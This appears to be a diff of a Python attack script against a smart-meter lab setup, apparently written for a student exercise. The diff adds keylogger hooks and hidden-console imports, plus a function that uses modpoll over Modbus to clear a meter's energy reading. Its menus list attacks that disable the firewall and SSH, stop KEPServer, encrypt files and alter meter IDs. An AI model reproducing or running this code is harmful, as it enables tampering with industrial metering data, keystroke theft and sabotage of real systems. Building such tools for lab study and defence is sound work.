@@ -11,8 +11,15 @@ from ctypes import windll
 from sys import executable, argv
 from win32netcon import ACCESS_ALL
 from win32net import NetShareAdd
-from time import sleep
+from win32console import GetConsoleWindow
+from win32gui import ShowWindow
+from pythoncom import PumpMessages
+from pyWinhook import HookManager
+from time import sleep, ctime
 
+global t
+
+t = ""
 copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory
 smartmeterpath = "C:\\Users\\Student\\Documents\\AttackFolder"
 
@@ -265,15 +272,14 @@ def changeMeterID():
     except CalledProcessError as e:
         print("Error executing the executable file:", e)
 
-def test():
+def clearEnergyReading():
     current_directory = getcwd()
     executable_path = current_directory + "\\modpoll.exe"
     checkEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
     clearEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]
-    editEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "26", "COM1", "9999"]
     try:
         check_call([executable_path] + checkEnergy)
-        check_call([executable_path] + editEnergy)
+        check_call([executable_path] + clearEnergy)
         check_call([executable_path] + checkEnergy)
     except CalledProcessError as e:
         print("Error executing the executable file:", e)
@@ -389,14 +395,26 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
             if process_name in proc.name():
                pid = proc.pid
                break
-
-        print("Modpoll pid:", pid, "has stopped.")
         kill(pid, signal.SIGKILL)
+        print("Modpoll pid:", pid, "has stopped. \nOk.")
 
     elif revertoption == "8":
         system('cmd /k "net share SmartMeterfolder /delete"')
+        print("Ok.")
+    elif revertoption == "7":
+        process_name = "keylogger"
+        pid = None
+
+        for proc in process_iter():
+            if process_name in proc.name():
+               pid = proc.pid
+               break
+            
+        kill(pid, signal.SIGKILL)
+        print("Keylogger pid:", pid, "has stopped.\nOk.")
+
     elif revertoption == "-h":
-        print("\n Choose: \n1 to enable firewall, \n2 to re-enable ssh through firewall, \n3 re-enable kepserver service, \4 re-enable COM port, \n5 decrypt encrypted files, \n6 change meter25 id back\n7 Provide process id to kill process\n 8 to remove shared folder")
+        print("\n Choose: \n1 to enable firewall, \n2 to re-enable ssh through firewall, \n3 re-enable kepserver service, \4 re-enable COM port, \n5 decrypt encrypted files, \n6 change meter25 id back, \n7 Kill Modpoll, \n8 to remove shared folder, \n9 Kill Keylogger.")
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
 
@@ -423,12 +441,12 @@ if __name__ == '__main__':
     elif attackoption == "9":
         changeMeterID()
     elif attackoption == "10":
+        clearEnergyReading()
+    elif attackoption == "11":
         revertoption = str(argv[2])
         revert(revertoption)
-    elif attackoption == "11":
-        test()
     elif attackoption == "-h":
-        print("\nChoose \n1 to delete file, \n2 to copy file, \n3 to disable firewall, \n4 to disable ssh through firewall, \n5 to disable Kepserver, \n6 to interrup modbus reading, \n7 to disable COMPORT, \n8 to encrypt files, \n9 change Meter25 Id to 26, \n10 to revert with options.")
+        print("\nChoose \n1 to delete file, \n2 to copy file, \n3 to disable firewall, \n4 to disable ssh through firewall, \n5 to disable Kepserver, \n6 to interrup modbus reading, \n7 to disable COMPORT, \n8 to encrypt files, \n9 change Meter25 Id to 26, \n10 to clearEnergyReading, \n11 to revert with options.")
 
     else:
         print ("Invalid Option! Use option \"-h\" for help!")
